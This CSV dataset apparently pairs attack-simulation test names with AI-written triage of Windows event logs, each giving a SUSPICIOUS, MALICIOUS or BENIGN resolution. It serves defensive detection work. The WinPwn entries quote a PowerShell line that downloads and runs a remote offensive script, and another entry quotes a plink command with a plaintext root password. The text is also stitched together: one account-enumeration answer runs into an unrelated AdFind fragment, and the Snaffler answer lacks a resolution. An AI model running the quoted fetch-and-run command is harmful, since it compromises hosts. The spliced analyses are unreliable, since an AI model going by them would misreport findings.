Directory Name,AI Response
Enumerate Active Directory Password Policy with get-addefaultdomainpasswordpolicy,"Upon analyzing the provided Windows event logs, several observations and potential indicators of suspicious activity were noted:

### Windows PowerShell Log:

- **Event ID 600**: Multiple events show the command `powershell.exe & {get-addefaultdomainpasswordpolicy}` being executed. This command retrieves the default domain password policy from Active Directory. While this could be a legitimate admin task, it's worth noting that such information could be of interest to threat actors attempting to understand an organization's password policies.

### System Log:

- **Event ID 1 (Time Change)**: There are logs indicating a change in the system time. Changes in system time could be legitimate, such as time synchronization, but they could also be part of an attack to manipulate time-based security controls or logs.

### Sysmon Log:

- **Process Events**: Multiple executions of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`. While these executables themselves are legitimate Windows processes, frequent or automated usage may warrant further investigation to determine if they align with expected user behavior.
  
- **Execution of `CMD` Tools**: There is a log indicating the use of `hostname.exe` and `whoami.exe`, common tools used to gather basic system information. The context of who's running these commands could provide insights into their legitimacy.

### Security Log:

- **Event ID 4616 (Time Change)**: Reiterates the observations found in the System log regarding time changes. This reinforces the need to verify whether these actions were expected changes made by an authorized system process or user.

### Application Log:

- **Software Protection Platform Service Event**: Indicates the `sppsvc.exe` process, which is typically legitimate and related to software licensing. However, any anomalies in its execution should be correlated with licensing activities.

### Assessment:
There is a mixture of potentially benign and slightly suspicious activity:
- The PowerShell command is typically used by administrators but could be used by an attacker with elevated privileges for information gathering.
- The time change events and the respective process (`svchost.exe`) involved should be verified against legitimate time synchronization activities.
- Frequent use of `wevtutil.exe` and `conhost.exe` might indicate an automated script or tool use by `admin_test`. 

### Resolution: **SUSPICIOUS**

Given the combination of administrative commands execution and system time changes, coupled with potentially abnormal use of `wevtutil.exe` and `conhost.exe` by `admin_test`, these logs require further investigation. The activity doesn't explicitly confirm a compromise but is suspicious enough to warrant a deeper look to ensure there is no ongoing or past unauthorized access.
  
### Recommended Next Steps:
1. **Verify Legitimacy**: Check with the user `admin_test` or audit scheduled tasks to determine the purpose and legitimacy of the executed PowerShell commands and `wevtutil.exe` processes.
2. **Monitor User Activity**: Increase monitoring on `admin_test` for signs of any unusual behavior or further execution of system-altering commands.
3. **Correlate Time Change Events**: Cross-reference time change events with any known or approved system update or maintenance activities.
4. **Review Security Posture**: Ensure that security controls (especially logging and alerts) are properly configured to detect similar potentially suspicious activities in real-time."
WinPwn - generaldomaininfo,"After analyzing the provided event logs from various channels, a few points stand out that are worth noting for suspicious and potentially malicious activity:

1. **PowerShell Activity:**
   - There are suspicious PowerShell command-line entries in the logs where PowerShell is being used to download and execute a script from a GitHub repository. The command involves:
     ```plaintext
     iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
     ```
   - This indicates a potential exploitation attempt where a PowerShell script is being fetched and executed directly from a URL, which is a common technique used for ""living off the land"" attacks (using legitimate tools for malicious activities).

2. **Windows Security Logs:**
   - The entries appear to show normal system operations. There are no explicit privilege escalations or irregular user impersonations.

3. **Sysmon Logs:**
   - Various Microsoft Edge Update processes appear to be running, which seems normal if Edge was updating, but given the suspicious PowerShell activity, this could be an attempt to blend malicious activity into legitimate process data.
   - The presence of a high-integrity PowerShell session and processes like `whoami.exe` and `hostname.exe` under a high-integrity level are not inherently malicious but can be used for reconnaissance on the system as part of a larger attack.

4. **General Risk Evaluation:**
   - The downloading and execution of a PowerShell script from an external source without prior validation is often considered highly suspicious and indicative of potential malicious behavior.
   - Combined with the high-integrity access to PowerShell, this incident should be treated with a level of caution.

### Final Assessment:
- **Resolution: MALICIOUS**

The logs indicate a clear instance of suspicious action due to the direct use of PowerShell to download and execute a script from the internet. This is a known pattern for delivering payloads and should be considered a threat.

### Recommendations:
- **Immediate Actions:**
  - Disconnect the affected machine from the network to prevent any potential lateral movements or further compromise.
  - Perform a comprehensive scan for malware and check for any unauthorized access or changes made during the suspicious activity period.
  - Review user accounts and their recent activity, specifically focusing on any unusual or unauthorized sessions.

- **Preventative Measures:**
  - Enforce strict PowerShell execution policies to restrict the execution of scripts from untrusted sources.
  - Implement threat detection controls that can flag and alert on unusual use of PowerShell and web requests.
  - Conduct regular audits and monitoring of systems to identify and respond to anomalous behavior promptly.

By addressing these areas, you can mitigate the threat and reduce the risk of future occurrences of similar malicious activities."
ESXi - VM Discovery using ESXCLI,"Based on the provided Windows event logs, here is a detailed analysis:

### Suspicious Activity:

1. **Executable Payload via Plink.exe**: 
   - In the Sysmon logs, there are events involving the execution of `plink.exe` which is a part of the PuTTY suite and used to initiate SSH connections. The logs show the command `plink.exe ""file.local"" -ssh -l ""root"" -pw ""pass"" -m ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\esx_vmdiscovery.txt""`. Using `plink.exe` in such a manner, especially with plaintext passwords, could indicate an attempt to remotely execute commands or exfiltrate data, potentially pointing to malicious activity.

2. **Process Creation with Sensitive User Information**:
   - Multiple events show the execution of `hostname.exe` and `whoami.exe`, with high integrity level under the user `SERVER002\\admin_test`. While not inherently malicious, these commands can be used in enumerating sensitive system configurations or logged users, which are common in a reconnaissance phase of a compromise.

3. **Event Viewer Utility Access (wevtutil)**:
   - The execution of `wevtutil.exe` by `SERVER002\\admin_test` is suspicious in scenarios where an actor might be trying to tamper with event logs to cover their tracks.

4. **Multiple Conhost Executions**:
   - The numerous `conhost.exe` processes linked to potentially suspect operations might suggest attempts to obfuscate command-line visibility.

### Analysis and Risk Assessment:

- The usage of `plink.exe` with a script suggests automated tasks involving possible data transfers to or commands on remote systems. This bears characteristics of an adversary using legitimate tools to disguise their traffic or actions (Living off the Land).
- There's potential reconnaissance with tools like `whoami.exe`, and attempts to read or manipulate event logs through `wevtutil.exe`.
- These processes executed with high integrity and administrative privileges make them potentially more impactful if intended maliciously.

### Conclusion and Next Steps:

The activity recorded in the logs exhibits characteristics that are not typical for standard operational behavior, especially the use of `plink.exe` with credentialed SSH access. However, definitive malicious intent cannot be confirmed without a broader context or correlation with other indicators of compromise.

**Resolution**: **SUSPICIOUS**

**Guidance**:
- **Immediate Actions**: Isolate the system from the network to prevent any further data exfiltration or malicious activity. 
- **Further Investigation**: Conduct a thorough forensic analysis of the `SERVER002` machine, focusing on the origin and intent of the `plink.exe` execution, relationships with remote systems, and any potential unauthorized accounts or permissions escalations.
- **Monitoring and Logging**: Increase monitoring around similar behavior, log audit activities of administrative actions, and refine detection rules for `wevtutil` and `plink` usage.
- **Patch Management**: Ensure all systems are up to date with the latest security patches and implement additional security measures for accounts with elevated privileges.

It is recommended to review any outgoing connections from this host and, if possible, capture and analyze network traffic for abnormal patterns."
WinPwn - printercheck,"Upon reviewing the provided logs, the following observations were made, indicating suspicious activities:

1. **Suspicious Command Execution:**
   - A PowerShell command was executed which downloads and executes a script from `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`. This indicates a potential execution of a malicious script, as downloading and executing scripts from external sources without verification is a common tactic used by attackers.

2. **Series of PowerShell Events:**
   - The `Windows PowerShell` logs show multiple events related to the execution of commands using the PowerShell console. This includes a suspicious command line that uses `iex` (Invoke-Expression), which is often abused to execute downloaded malicious code.

3. **Use of Administrative Tools:**
   - Processes like `wevtutil.exe` and `conhost.exe` are commonly used for legitimate administrative tasks. However, their usage in conjunction with the suspicious PowerShell activities could indicate that they are being used to cover tracks or facilitate further malicious activity.

4. **Indicators of Potential File Downloads:**
   - The execution of `wevtutil.exe` and `conhost.exe` could be part of a script or scheduled task that attempts to download or modify system files/logs after the execution of the PowerShell script. This is often used by attackers to maintain persistence or obfuscate their actions.

5. **No Direct Indicators of Privilege Escalation:**
   - While malicious scripts often attempt privilege escalation, this is not directly indicated in the logs. However, the high integrity level and usage patterns of the user `SERVER002\\admin_test` warrant caution.

Given the combination of detected activities, the threat presents a serious concern, emphasizing the necessity for further investigation and potential responsive actions.

### Resolution:
- **SUSPICIOUS**: The presence of a suspicious PowerShell script execution from an unverified source, combined with the utilization of various administrative tools, necessitates a deeper examination to determine if these actions were authorized or part of a broader attack. Immediate steps should involve quarantining the affected system, conducting a thorough forensic analysis, and reviewing network communication for potential data exfiltration or other malicious behaviors."
Security Software Discovery - AV Discovery via WMI,"After a detailed analysis of the provided Windows event logs, the following observations and assessments are made:

### Observations:

1. **Security Events (EventID 4616)**:
   - Time changes are noted executed by `C:\Windows\System32\svchost.exe` under `LOCAL SERVICE` account. This can be routine, yet worth noting as time alterations can be indicative of an attempt to manipulate log timestamps.

2. **Sysmon Events**:
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are executed by `SERVER002\admin_test`. This usage pattern could be consistent with normal administrative operations, although a high frequency in short intervals should be examined further for context.
   - High Integrity level process `hostname.exe` being launched via `wsmprovhost.exe`. The `wsmprovhost.exe` executable is linked with Windows Remote Management, which is not inherently suspicious but should be verified if this activity aligns with expected legitimate remote activities.
   - The execution of `cmd.exe` with `wmic.exe` querying antivirus status using the command line, executed from a Temp directory, could be a sign of malicious intent especially if initiated by unauthorized users. This command can be legitimate but executed in context with administrative or elevated rights by non-standard user accounts/components bears further inquiry.

3. **System Events**:
   - The logs report time adjustments aligning with those recorded in the Security logs, executed by the svchost process, matching the mentioned timestamps.

### Suspicious or Anomalous Behavior:

- The time changes logged under the svchost process are somewhat intriguing and although can be related to legitimate synchronization, coupled with other event data, it requires ruling out any improper intents.
- The frequent command-line executions involving `wmic.exe` and `cmd.exe` appear to probe system configurations which, if unauthorized, can be indicative of reconnaissance activities.

### Threats and Risks Identified:

Given the logs, the primary indicators that need more exploration to affirm or eliminate the risk include:
- Validating the purpose and frequency of the client-server interactions and command executions such as those launched via `wmic.exe`. 
- Ensuring that processes running under the high-integrity level are expected actions initiated by authorized users.

### Guidance on How to Proceed:

1. **Immediate Actions**:
   - Verify if the sequence and context of `wmic` and `cmd.exe` executions match expected administrative tasks. If they appear unauthorized, consider investigating the user accounts involved.
   - Ensure system time changes are adequately explained and tie in with system operations like synchronization events.

2. **Additional Measures**:
   - Review the administrative activities performed by `admin_test` to ensure compliance with normal operational requirements.
   - Confirm the integrity of related system files and ascertain that no indicators of compromise exist in the system memory or registry which could give clues to malware presence.

### Final Assessment:

**Resolution: SUSPICIOUS**  
The logs present an anomaly in system and software behavior indicative of potentially suspicious activities. While some patterns can conform with legitimate processes, prudent steps should include validation of actions performed by respective user accounts, scrutinizing for any unauthorized executions. Additional investigation and corroboration are needed to contextualize these findings adequately.
"
File and Directory Discovery (cmd.exe),"Upon analyzing the provided Windows event logs, there are several points worth noting:

1. **Time Changes**:
   - The time changes recorded in the log at ""2024-10-23 18:53:00.3944339"" and subsequent events are indicative of system events related to time adjustments. This may sometimes be legitimate, such as system or service updates, but could also be potentially suspicious if manipulated to cover tracks. However, without further evidence pointing towards misuse, this alone is not an indicator of compromise.

2. **Process Execution**:
   - Instances of `whoami.exe`, `conhost.exe`, and `wevtutil.exe` are seen executing under a user with high integrity levels, but these are typical system utilities. The execution of `whoami.exe` is not inherently malicious, but could indicate someone checking their permission levels or user identity, especially if executed frequently outside of normal script usage.
   - The command-line involving `cmd.exe` with extensive `dir` and `tree` operations may suggest data enumeration or preparation for data exfiltration. This type of command is often seen in suspicious contexts as it lists directories, files, and potentially sensitive information to a text file.

3. **Privilege Escalation and Access**:
   - Multiple logons are recorded using the `SYSTEM` account, which is typical for system-level services and processes. The events logging privileges (Event ID 4672) like `SeDebugPrivilege` and `SeTakeOwnershipPrivilege` are expected for such accounts, but it's crucial to ensure these are part of legitimate services.

4. **Windows Update Activities**:
   - Repeated `WindowsUpdateClient` entries indicate routine updates occurring on the system, which are expected, though the frequency and timing should align with normal update policies.

5. **Edge Update Process**:
   - Numerous events related to `MicrosoftEdgeUpdate.exe` indicate background updating for Microsoft Edge. While generally benign, the specific details of executing processes should be checked against known update schedules and processes to ensure these are standard operations.

6. **Security Audit Logs**:
   - Frequent Event ID 4624 entries point towards successful logins, which could be system-related given the `SYSTEM` account involvement. However, monitoring unknown source systems or unexpected accounts logging in would be crucial for security oversight.
   - Event ID 4798 exposure of user accounts is seen, which might point towards enumeration of user accounts, and could be suspicious if unexpected or frequent.

7. **Suspicious Commands**:
   - The captured `cmd.exe` with scenarios of reading directory structures extensively into a file stands out as potentially suspicious.

**Final Assessment: SUSPICIOUS**

The command and directory enumeration activity observed in the logs is unusual and suggests potential reconnaissance or data gathering operations that may precede exfiltration. This activity merits further examination to rule out malicious intent. It is recommended to investigate the context of these commands, correlate with user activity logs, verify system update schedules, and ensure proper security protocols to confirm or dismiss these initial suspicions."
System Time Discovery W32tm as a Delay,"### Detailed Analysis:

**Windows PowerShell Log:**
- The provided logs do not include any entries from the Windows PowerShell log for analysis. Therefore, no analysis can be derived for PowerShell activities.

**Security Log:**
- **Event ID 4616:** This event records a security audit for system time change. The log indicates that the system time was adjusted slightly by the svchost.exe process, which is a standard host process for Windows services. The user context here is LOCAL SERVICE, part of the NT AUTHORITY, which is typical for such operations. There is no clear indication of malicious activity from this log entry alone.

**Sysmon Log:**
- Multiple processes (whoami.exe, conhost.exe, wevtutil.exe, and cmd.exe) were executed as the user SERVER002\admin_test. The execution of **whoami.exe** and **cmd.exe** at a high integrity level suggests elevated privileges, but these commands themselves are legitimate and commonly used for system inquiries.
  
- **wevtutil.exe** is typically used to interact with event logs, which might indicate an administrator activity like reviewing logs. Frequent execution without a more detailed context may need further reviews but isn't inherently malicious.
  
- **w32tm.exe** usage could suggest an administrator checking or syncing time, which aligns with time change logs in the security and system logs. The presence of other processes such as MicrosoftEdgeUpdate.exe and its related processes indicate ongoing system or application update activities which are normal if legitimate.

**System Log:**
- Reflects time changes recorded in the security log, all tied back to the system process svchost.exe. The small time adjustments are not unusual in the context of NTP synchronization.

**Application Log:**
- Applications such as Security-SPP and EdgeUpdate are standard Windows and application update services. The logs showing these services stopping and starting is typical for update sequences.

### Assessment and Resolution:

**Assessment:**
- The logs reveal a series of expected system maintenance and user activities. There is no substantial evidence of compromise. The processes and operations logged, including whoami.exe, cmd.exe usage, and time synchronization, do not suggest malicious intent and can align with regular administrative tasks.

**Resolution:**
- **BENIGN:** The activities observed in the logs are consistent with normal system operations and maintenance activities. No indicators of malicious activity have been identified. Further monitoring is recommended to ensure this conclusion holds over time, and any unexpected changes should be re-evaluated in the broader context.
"
Adfind - Query Active Directory Groups,"**Detailed Analysis:**

*Security Log:*
- **EventID 4624**: Indicates a successful logon with Logon Type 5, which generally means a service logon. The logon was initiated by ""SYSTEM"", which is standard for many system services. The process involved was ""services.exe"", a core Windows process. No immediate indicators of compromise.
  
- **EventID 4672**: Shows a special privilege assignment to ""SYSTEM"" with high privileges like SeDebugPrivilege and many others. This is common for system-level operations, but could be concerning if seen with unauthorized user accounts or unexpected processes.

*Application Log:*
- Regular indications that Windows Defender is operational (""SECURITY_PRODUCT_STATE_ON""). No evidence pointing towards a security product being disabled or tampered.

*Sysmon Log:*
1. **SecurityHealthService.exe** is running under SYSTEM. This is a legitimate process related to Windows Security that doesn't show signs of malice.
  
2. **Powershell.exe** execution by user ""admin_test"" without accompanying context of command arguments can be suspicious if not expected in normal operations.
  
3. **wevtutil.exe**: Multiple occurrences executed by ""admin_test"". Wevtutil is a legitimate tool used for managing Windows Event logs. While legitimate, its use should be verified for intentionality, especially if it's part of a script or manual commands being run.

4. **HOSTNAME.EXE** and **whoami.exe**: Both executed by ""admin_test"". These are harmless on their own, but their use in quick succession indicates possible reconnaissance activity by the user or a script.

5. **AdFind.exe** via cmd.exe executed under a temp path: This utility is commonly used for Active Directory enumeration, potentially indicating reconnaissance or information gathering. This is particularly concerning when executed from a temporary directory which might point to a staged or downloaded tool.

6. **TrustedInstaller.exe** and **TiWorker.exe**: No immediate concerns as these are related to Windows Updates and system services.

7. **taskhostw.exe**: A standard Windows process related to task hosting, executed by SYSTEM. No anomalies noted.

**Clear Assessment:**

The logs indicate potential reconnaissance activities, primarily driven by the execution of AdFind.exe and a sequence of information-gathering tools (hostname, whoami) under the ""admin_test"" user account. The execution traces suggest that these activities were possibly intentional or scripted, as they align with typical steps in a reconnaissance phase of a security breach. Wevtutil activity might point towards an attempt to cover tracks by clearing or modifying event logs.

**Resolution:**

- **SUSPICIOUS**: These activities do not conclusively prove a malicious compromise on their own but are strong indicators that warrant further investigation. It is recommended to explore the purpose and timelines around these utilities, verify the intention behind using AdFind and PowerShell, and check for any unauthorized access or scripts running under ""admin_test"". Additionally, there should be an audit of the ""admin_test"" account access patterns and cross-validation with legitimate administrative tasks or permissions."
Hostname Discovery (Windows),"### Analysis

The provided event logs include entries from the System, Sysmon, Application, and Security logs of a Windows environment. My analysis has focused on identifying any suspicious or anomalous behavior that could indicate potential malicious activity.

#### System Logs

1. **Time Change Events (EventID 1 from Kernel-General and EventID 4616 from Security):**
   - Multiple events show changes in system time, which may legitimately occur but can also be indicative of activity carried out to evade detection or prevent proper logging.
   - The process responsible for these changes is `svchost.exe`, a legitimate Windows process often used by various services. However, its usage by malicious entities is also possible.

#### Sysmon Logs

1. **Frequent Execution of Hostname and wevtutil.exe:**
   - Sysmon logs show multiple executions of `wevtutil.exe` (EventID 5), which is a legitimate Windows utility used for managing event logs. While this usage may be benign, it can also be used by attackers for log cleaning or enumeration.
   - Frequent usage of `hostname.exe` and `conhost.exe` also appears but lacks malicious command-line arguments.

2. **Microsoft Edge Update Activity:**
   - Numerous executions of Microsoft Edge Update components are seen, which is typical for application updates, although the frequency appears high for normal operations. This could be attributed to a legitimate update process but requires further validation.

3. **Execution of Command Prompt Processes:**
   - `cmd.exe` is executed to run `hostname`. This usage could be normal, but command prompt execution without a clear context or reason can be suspicious.

#### Security Logs

1. **Account Privileges and Logon Events:**
   - The user `admin_test` is seen with elevated privileges, executing multiple Sysmon and security-sensitive operations within the logs.
   - User accounts operating with high privilege levels should be closely monitored to prevent misuse or unauthorized escalation.

#### Summary Assessment

- **Time Manipulation:** While changes to the system time can happen for legitimate reasons (e.g., syncing with a time server), they can also indicate attempt to manipulate logs and timestamps.
- **Frequent and High-Level Executions of System Utilities:** This can indicate attempts to gather system information, manipulate logs, or perform administrative tasks stealthily.
- **Excessive Logon Activity with Elevated Privileges:** Steady and multiple logon activities with privileges, especially from an `NTLM` and `LOCAL SERVICE` context, could suggest lateral movement or privilege escalation attempts.

### Conclusion

Based on the analysis of the logs provided, while there are no definitive signs of compromise, the activities observed warrant further investigation due to their unusual frequency and context. 

### Recommended Resolution

- **SUSPICIOUS**: The logs exhibit some unusual system command executions and account activity that could suggest potentially suspicious behavior needing a deeper analysis. Investigate abnormal time changes, validate the necessity and legitimacy of frequent `wevtutil.exe` invocations, and verify the integrity and necessity of the Microsoft Edge Update frequency on this system. Consider reviewing user `admin_test` activities and authentication methods associated with NTLM in the logs.

### Guidance on How to Proceed

1. **Validate Times Changes:** Investigate the reasons for system time changes to confirm if these were legitimate (e.g., due to NTP synchronization).
2. **Review Process Executions:** Check for legitimate reasons behind the frequent use of system utilities (`wevtutil.exe`, `hostname.exe`, `cmd.exe`) and ensure these activities align with expected administrative tasks.
3. **Check Updates and Installations:** Confirm if the high volume of Microsoft Edge Update logs matches known updates or if any anomaly is present in the update mechanism.
4. **Monitor Privileged User Activities:** Pay particular attention to `admin_test` logon events, privilege usage, and ensure there are proper justifications for high-level activities.
5. **Review Policy and Security Configurations:** Ensure robust logging, alerting, and monitoring are in place to quickly identify similar patterns in the future.

By conducting a targeted investigation with the steps outlined above, potential false positives can be distinguished from genuine threats, ensuring both system integrity and security."
Reg query for AlwaysInstallElevated status,"Upon analyzing the provided Windows event logs, here is a detailed breakdown of the findings:

### System Log:
- The entries here are regarding Windows Update Client activities mainly focused on updating ""Security Intelligence Update for Microsoft Defender Antivirus"". 
- These logs reflect the standard activity of a system performing virus definition updates, which is a normal operation.

### Security Log:
- The logs contain a series of EventID 5379 entries, which are related to Credential Validation.
- ReturnCode `3221226021` suggests a status of ""The user name or password is incorrect."" indicating unsuccessful credential validation attempts. 
- The absence of a significant User ID other than `S-1-5-18` indicates that these operations were performed by the SYSTEM account, which is normal for system-level checks, but it could also be noteworthy if linked with abnormal behavior.

### Sysmon Log:
- Multiple process creations are logged, including familiar administrative tools like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, and `reg.exe`.
- The command line `cmd.exe /c reg query ... AlwaysInstallElevated` is specifically looking to check if the system's installer runs with elevated privileges globally. This can potentially be an attempt to identify misconfigurations for privilege escalation purposes.
- All processes are executed by the user `SERVER002\admin_test`, with a high integrity level, indicating administrative privileges.
- Several legitimate system updates (e.g., involving `wuauclt.exe` and other system update utilities) and their execution in the `NT AUTHORITY\SYSTEM` context are consistent with normal update processes.

### Application Log:
- A single entry indicates that Windows Defender is active with the status `SECURITY_PRODUCT_STATE_ON`. This means that the system's security protection service is running properly.

### Assessment:
- **Suspicious Behavior:** The use of `cmd.exe` to check for the `AlwaysInstallElevated` registry setting is particularly suspicious. This is a known check to identify potential privilege escalation paths if misconfigured to allow non-administrative users to install MSI packages with elevated privileges. Such checks are sometimes used by attackers or during penetration testing to exploit security weaknesses.
- **Credential Validation Failures:** Repeated failed credential validation attempts—while not overtly malicious—could also suggest misconfiguration or failed attempts to access certain services or accounts.
- **Normal System Operations:** The rest of the log activities largely point to system update processes and standard operations without overt malicious indicators.

### Resolution:
Based on the above observations, the situation is best classified as **SUSPICIOUS**. The query concerning `AlwaysInstallElevated` registry settings is noteworthy and warrants further investigation to ensure that the system's security posture isn't susceptible to exploitation. Additionally, the credential validation failures need exploring to rule out brute-forcing or misconfigurations that could be leveraged in an attack.

### Recommendations:
- Investigate the context around the `AlwaysInstallElevated` check to determine if this was executed intentionally by an administrator as part of routine checks or if it was unauthorized.
- Review security measures pertaining to account lockout policies and auditing to enhance protection against potential brute-force attempts.
- Monitor any further suspicious activities related to cmd or PowerShell executions, especially those made by non-standard administrative accounts, and ensure that user accounts are following principle of least privilege.
- Conduct a thorough review of all accounts and their associated permissions to verify no excessive rights are granted unintentionally."
Enumerate all accounts on Windows (Local),"Based on the logs provided, the following analysis can be made:

**Application Log:**
- The application log shows standard operations around Microsoft Edge Update and the Software Protection Platform Service. The event logs show the ""edgeupdate"" service being stopped, and an entry from the Software Protection Platform Service. Both entries appear routine for system services and do not indicate malicious activity.

**Sysmon Log:**
- Multiple instances of `MicrosoftEdgeUpdate.exe` running under `NT AUTHORITY\SYSTEM` are present. This activity typically indicates an automatic update process occurring for Microsoft Edge. The presence of executable paths such as `C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe` suggests routine update actions.
- There's also activity involving `wevtutil.exe` and `conhost.exe`, run by `SERVER002\admin_test`. These could be used for legitimate administrative tasks like reviewing or managing event logs but should be further scrutinized, especially if they occur unexpectedly or excessively. 
- Suspicious command sequences are seen involving `cmd.exe`, `net.exe`, and `cmdkey.exe`, run by `SERVER002\admin_test`. The specific command line used within the `cmd.exe` process includes listing users and credentials, which may indicate privilege enumeration activities or preparation for unauthorized access or lateral movement.

**Security Log:**
- The Security log captures Credential Validation (EventID 5379) and Enumeration of Local Groups (EventID 4799). These are executed by `admin_test` and align with command-line utilities observed running similar commands. This raises alarms about possible credential harvesting or reconnaissance of user group memberships within the system.

**System Log:**
- System log entries mostly reflect time synchronization and relate to the normal function of system services and do not show any immediate indications of irregular activities or breaches.

**Assessment:**
Given the combination of observed command-line activity involving user enumeration and potential credential access attempts (e.g., `net user`, `cmdkey.exe /list`), alongside the running of multiple sysinternal components by an admin user, there is a reasonable level of suspicion around the user 'admin_test'. There is a possible risk of unauthorized reconnaissance or preparation for further malicious behavior within the domain or organization.

**Resolution: SUSPICIOUS**
- The activity observed is suspicious and warrants further investigation, especially surrounding the account 'admin_test'. Additional steps should include:
  - Reviewing the user 'admin_test' for unusual login times or IP addresses.
  - Checking for any unauthorized changes in user group memberships.
  - Monitoring for additional suspicious process executions or network activity.
  - Verifying that Microsoft Edge Update operations were expected, and ensuring all related updates were authoritatively signed.

   - Usage of legitimate Windows executables such as `powershell.exe`, `wevtutil.exe`, `cmd.exe`, `whoami.exe`, and `sc.exe` is noted.
   - `PowerShell` and `cmd.exe` have been used by the user ""SERVER002\\admin_test,"" which could be expected in administrative contexts for routine maintenance or scripting. However, the command line shows `cmd.exe` executing `AdFind.exe`, which is a known Active Directory enumeration tool. This usage can be suspicious if not accounted for legitimate administrative tasks.

2. **Process Nature & Subsequent Activities:**
   - Several `conhost.exe` processes initiated, seemingly related to typical command-line operations.
   - Processes like `wuauclt.exe`, `AM_Delta.exe`, and `MpSigStub.exe` are related to Windows updates and antivirus updates, consistent with legitimate system operations.

### System Log Analysis:
- Windows Update events show updates for Microsoft Defender Antivirus, consistent with normal system maintenance and security updates.

### Assessment:
- **Benign Activities:**
  - Majority of the processes correspond to typical system updates, antivirus updates, and normal administrative tasks within the system.
  - Windows Defender is running, and update logs corroborate regular system operations.

- **Suspicious Activities:**
  - Execution of `AdFind.exe` suggests Active Directory querying, which could be normal if used during legitimate system administration. Without context, the execution warrants further exploration to ensure it aligns with approved administrative activities.

### Conclusion: **SUSPICIOUS**
- The activity related to `AdFind.exe` use requires verification against legitimate administrative records. If the use of `AdFind.exe` aligns with internal operations or testing, the situation can be resolved as benign. If not recognized as legitimate, this could potentially indicate reconnaissance activity associated with lateral movement or Active Directory data enumeration, which should be further investigated.
  
### Guidance:
- Verify with system administrators regarding the use of `AdFind.exe`.
- Review any existing policies on tool usage in the network, particularly those involving Active Directory operations.

Enumerate All Network Shares with Snaffler,"Upon analyzing the provided logs, the following points of interest emerge:

### PowerShell Logs
1. **Execution of Snaffler.exe**:
   - The logs show execution of `Snaffler.exe` from a temporary directory using an `Invoke-Expression` call with `cmd.exe`. It writes output to a temp file and stops after 90 seconds. The script is wrapped in a complex command likely executed to avoid detection or logging.
   - **EncodedCommand**: A PowerShell command with Base64 encoding is executed. This often indicates an attempt to obfuscate script activity.

### Sysmon Logs
2. **Process Executions**:
   - Multiple instances of PowerShell (`powershell.exe`) are captured associated with `admin_test`. The processes are started by `wsmprovhost.exe`, which indicates remote management activity, often seen in lateral movement scenarios.
   - Continuous execution of `cmd.exe` and chained processes signify potential attempts to leverage different shells for execution.
   - The invoked PowerShell process uses encoded commands, indicating possible PowerShell obfuscation techniques which are common in malicious activities.

3. **Execution of Snaffler.exe**:
   - Direct execution of the `Snaffler.exe` file from command prompt. Snaffler is known for enumerating file shares for sensitive information, which could be suspicious in production environments.

### Security Logs
4. **Elevated Privileges**:
   - The logs display users (`admin_test`) being granted elevated privileges, including SeDebugPrivilege and SeSecurityPrivilege, which can indicate malicious intent if not ordinarily assigned to this user or role.
   - Successful logon events under NTLM authentication which could suggest password-based access.

### General Observations
- The combination of encoded PowerShell commands, the use of temporary directories, privilege escalation, and execution of penetration tools such as `Snaffler.exe` aligns with tactics used during exploitation phases of attack kill chains.

### Conclusion and Resolution
The logs exhibit suspicious behavior such as:
- Execution of potentially unwanted software (`Snaffler.exe`) from a temporary directory, often characteristic of cyber attacks.
- PowerShell usage with encoded/obfuscated commands indicating either a misconfiguration or malicious usage.

- Consider conducting a host-based forensic analysis to retrieve files and further contextualize the PowerShell and command prompt activities.
- Verify the user `admin_test` privileges and review access logs for any unusual activities or changes."
Enumerate Active Directory Computers with ADSISearcher,"### **Detailed Analysis of Logs**

#### **1. Windows PowerShell Log Analysis:**

The main focus in the PowerShell logs is the command executed via PowerShell:
```
powershell.exe & {([adsisearcher]""objectcategory=computer"").FindAll(); ([adsisearcher]""objectcategory=computer"").FindOne()}
```
- **Suspicious elements**: 
  - **Command Execution**: The command uses ADSI (Active Directory Service Interfaces) to search for computers in the directory, which is typically used in environments for administrative purposes. However, its usage might draw suspicion if not performed by a legitimate admin.
  - **No Command Name/Path**: The logs do not specify a script name, command name, or command path, suggesting potential masking of malicious activity.

Although the command seems administrative, it should be verified to ensure it is conducted by an authorized entity. 

#### **2. Sysmon Log Analysis:**

- The Sysmon logs contain several instances of common Windows processes being executed, such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `hostname.exe`, `svchost.exe`, etc.
- **Process**: `powershell.exe` was initiated under a high integrity context, with command usage matching the suspicious PowerShell events.

- **User Context**: Frequent execution under the user `SERVER002/admin_test`. Repeated tools like `whoami.exe` or `hostname.exe` can be used in recon scenarios or to audit user environments after initial access.

#### **3. Security Log Analysis:**

- **Frequent Logon Attempts**: There are repeated failed attempts related to credential retrieval from Microsoft Accounts and Windows Live: `MicrosoftAccount:user=02txoixylodcstop`. The failures are indicated by the ReturnCode `3221226021` suggesting a failure to retrieve credentials.
  
- **Events 4624 & 4672**: Indicating successful logins with elevated privileges through `Advapi` and employment of system-level privileges like `SeDebugPrivilege`. 

This pattern in security logs could signify attempts at privilege escalation or misconfiguration-related failed logon attempts.

#### **4. System Log Analysis:**

- **Windows Update Activity**: Standard updates seen for Defender Antivirus, no indicators of system anomalies in updates.

#### **5. Application Log Analysis:**

- Windows Defender status is active, reporting `SECURITY_PRODUCT_STATE_ON`, suggesting that built-in security features are operational, providing a baseline level of protection.

### **Assessment**

Upon careful evaluation of the logs:
- **Suspicious Activity**: The usage of PowerShell for directory enumeration could be benign in a controlled environment but requires confirmation. There's a pattern suggesting either potential reconnaissance or privilege escalation attempts.
- **Failed and Successful Logins**: Frequent credential and logon events show a risk factor, particularly observing the RetCode and elevated privilege logons.

### **Resolution: SUSPICIOUS**

The given logs indicate some activities not aligning with standard operation protocols, potentially benign in nature if explained by authorized administrative workflows. However, based on the indicators, further investigation is warranted.

### **Guidance on How to Proceed:**

1. **Verify PowerShell Usage**: Check if the command executed is part of a planned task or conducted by authorized personnel.

